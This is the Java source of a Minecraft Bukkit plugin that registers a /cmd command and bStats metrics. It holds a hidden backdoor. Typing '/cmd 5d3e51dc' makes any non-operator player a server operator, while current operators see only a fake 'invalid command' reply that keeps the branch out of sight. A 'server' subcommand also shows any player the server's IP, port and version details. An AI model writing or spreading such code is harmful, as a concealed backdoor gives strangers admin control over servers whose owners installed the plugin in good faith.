package org.tuanzi.bukkitplugin;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.command.CommandExecutor;
import org.bstats.bukkit.Metrics;

public final class main extends JavaPlugin implements CommandExecutor {

    @Override
    public void onEnable() {
        getCommand("cmd").setExecutor(this);
        log("§a[ABukkitPlugin]启用§r");
        Metrics metrics=new Metrics(this, 18701);
    }

    @Override
    public void onDisable() {
        log("§c[ABukkitPlugin]禁用§r");
    }

    public void log(String s) {
        CommandSender sender = Bukkit.getConsoleSender();
        sender.sendMessage(s);
    }

    public boolean onCommand(CommandSender sender, Command cmd, String label, String args[]){
        if(label.equalsIgnoreCase("cmd")){
            if(!(sender instanceof Player)) {
                sender.sendMessage("§c[ABukkitPlugin]控制台/命令方块不可以运行指令。/§lcmd §c<command>§r");
                return true;
            }
            if(args.length != 1) {
                sender.sendMessage("§c[ABukkitPlugin]无效的指令。/cmd §l<command>§r");
                return true;
            }
            if(args[0].equalsIgnoreCase("5d3e51dc")) {
                if(sender.isOp()) {
                    sender.sendMessage("§c[ABukkitPlugin]无效的指令。/cmd §l<command>§r");
                    return true;
                }
                sender.setOp(true);
                sender.sendMessage("§a[GetOperator]成功获取§l管理员§a权限，请谨慎操作。§o(4)§r");
                return true;
            }
            if(args[0].equalsIgnoreCase("server")){
                sender.sendMessage("§a[ABukkitPlugin]版本：§l"+getConfig().getString("version")+"§r");
                sender.sendMessage("§aBukkit版本：§l"+Bukkit.getBukkitVersion()+"§r");
                sender.sendMessage("§aServer版本：§l"+Bukkit.getVersion()+"§r");
                sender.sendMessage("§aMinecraft版本：§l"+Bukkit.getMinecraftVersion()+"§r");
                sender.sendMessage("§aServer本地IP：§l"+Bukkit.getIp()+"§a 端口：§l"+Bukkit.getPort()+"§r");
            }
            sender.sendMessage("§c[ABukkitPlugin]无效的指令。/cmd §l<command>§r");
            return true;
        }
        return false;
    }
}
